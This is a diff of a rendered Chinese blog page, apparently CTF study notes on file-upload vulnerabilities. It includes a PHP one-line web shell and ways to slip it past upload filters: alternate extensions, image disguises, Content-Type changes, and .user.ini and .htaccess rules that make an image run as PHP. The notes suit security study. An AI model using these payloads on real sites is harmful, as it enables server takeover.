@@ -56,8 +56,8 @@
         color="0,0,255" opacity='0.7' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
 
         <div id="toc" class="toc-article">
-    <div class="toc-title">目录</div>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0upload"><span class="toc-text">文件上传upload</span></a></li></ol>
+    <div class="toc-title"></div>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0upload"><span class="toc-text">文件上传upload</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%AB%AF%E9%99%90%E5%88%B6"><span class="toc-text">前端限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E7%AB%AF%E9%99%90%E5%88%B6"><span class="toc-text">后端限制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#user-ini%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%BB%95%E8%BF%87"><span class="toc-text">.user.ini配置文件绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#htaccess-%E7%8E%AF%E5%A2%83%E4%B8%BAApache%E6%97%B6%E4%BD%BF%E7%94%A8"><span class="toc-text">.htaccess(环境为Apache时使用)</span></a></li></ol></li></ol></li></ol>
 </div>
         
         <div id="layout">
@@ -193,7 +193,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/Web/" style="color: #00bcd4">Web</a>
+                <a href="/blog/tags/Web/" style="color: #ff7d73">Web</a>
             </span>
             
         </span>
@@ -203,20 +203,38 @@
     <div class="content" v-pre>
         <h1 id="文件上传upload"><a href="#文件上传upload" class="headerlink" title="文件上传upload"></a>文件上传upload</h1><span id="more"></span>
 
-<ul>
-<li><p>php写一句话木马上传</p>
+<blockquote>
+<p>原理：php写一句话木马上传</p>
+</blockquote>
 <pre><code class="php">&lt;?php @eval($_POST[&#39;c&#39;]);?&gt;
 </code></pre>
-<ul>
-<li>PHP环境下若php被过滤且无提示，传入**.phtml&#x2F;.php3&#x2F;.php4**的一句话木马（可当作php解析）</li>
-<li>要求传图片，可写入一句话木马改成图片格式，上传时改成.php</li>
-<li>php过滤可尝试改成Php</li>
+<h2 id="前端限制"><a href="#前端限制" class="headerlink" title="前端限制"></a>前端限制</h2><blockquote>
+<p>f12修改页面可解</p>
+</blockquote>
+<h2 id="后端限制"><a href="#后端限制" class="headerlink" title="后端限制"></a>后端限制</h2><ul>
+<li><p>限制传图片，</p>
+<p>可写入一句话木马改成<code>jpg</code>,<code>png</code>等图片格式，上传时改成.php</p>
+</li>
+<li><p>PHP环境下若php被过滤，</p>
+<p>传入后缀为<code>.Php</code> ,<code>.phtml</code> ,<code>.php3</code> ,<code>.php4</code>的一句话木马（可当作php解析）</p>
+</li>
+<li><p>文件内容字符限制</p>
+<p>尝试把<code>&lt;?php</code>改为<code>&lt;?Php</code></p>
+</li>
 </ul>
-</li>
-<li><p>php写&lt;?php phpinfo();?&gt;直接上传</p>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mmzkyl/article/details/112138834">.htaccess</a>(环境为Apache时使用)</p>
-<pre><code class="htaccess">&lt;FilesMatch &quot;1.jpg&quot;&gt;
+<h3 id="user-ini配置文件绕过"><a href="#user-ini配置文件绕过" class="headerlink" title=".user.ini配置文件绕过"></a><a target="_blank" rel="noopener" href="https://www.dazhuanlan.com/vip_mmles/topics/1547397">.user.ini配置文件绕过</a></h3><p>可用于抓包可上传但不解析且文件夹下存在php文件的情形</p>
+<blockquote>
+<p>php.ini 是 php 的一个全局配置文件，对整个 web 服务起作用；而.user.ini 和.htaccess 一样是目录的配置文件，.user.ini 就是用户自定义的一个 php.ini，通常用这个文件来构造后门和隐藏后门</p>
+</blockquote>
+<pre><code class="php">相关配置项，作用相当于文件包含
+auto_prepend_file = &lt;filename&gt;         //包含在文件头
+    在当前目录下的.php 文件包含 1.jpg(以1.jpg为例),即在php文件头插入require(&#39;1.jpg&#39;)
+auto_append_file = &lt;filename&gt;          //包含在文件尾
+</code></pre>
+<ul>
+<li>包含在文件尾的语句遇到<code>exit()</code>等会失效</li>
+</ul>
+<h3 id="htaccess-环境为Apache时使用"><a href="#htaccess-环境为Apache时使用" class="headerlink" title=".htaccess(环境为Apache时使用)"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/mmzkyl/article/details/112138834">.htaccess</a>(环境为Apache时使用)</h3><pre><code class="htaccess">&lt;FilesMatch &quot;1.jpg&quot;&gt;
 
 Sethandler application/x-httpd-php
 #&lt;!-- 将匹配到的 1.jpg 文件按照php解析执行 --&gt;
@@ -229,8 +247,6 @@ Addhandler php5-script .jpg
 </code></pre>
 <ul>
 <li>记得改Content-Type</li>
-</ul>
-</li>
 </ul>
 <hr>
 
